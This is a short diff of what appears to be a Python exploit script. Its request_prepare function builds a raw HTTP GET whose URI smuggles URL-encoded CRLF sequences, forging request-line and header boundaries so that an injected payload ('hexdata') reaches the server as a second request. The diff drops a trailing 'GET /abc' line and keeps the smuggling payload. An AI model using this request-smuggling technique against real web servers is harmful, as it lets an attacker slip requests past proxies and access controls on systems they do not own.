@@ -12,8 +12,7 @@ def request_prepare():
     hexdata = hexdata.replace(b'=', b'%3d')
     # print(hexdata)
     uri = b'/page/index.php%20HTTP/1.1%0d%0aHost:%20localhost%0d%0aUser-Agent:%20Mozilla/5.0%20(' \
-          b'Windows%20NT%2010.0;%20Win64;%20x64;%20rv:120.0)%20Gecko/20100101%20Firefox/120.0%0d%0a%0d%0a' + hexdata + \
-          b'%0d%0a%0d%0aGET%20/abc'
+          b'Windows%20NT%2010.0;%20Win64;%20x64;%20rv:120.0)%20Gecko/20100101%20Firefox/120.0%0d%0a%0d%0a' + hexdata
     reqst = b'''GET %b HTTP/1.1\r
 Host: localhost\r
 \r
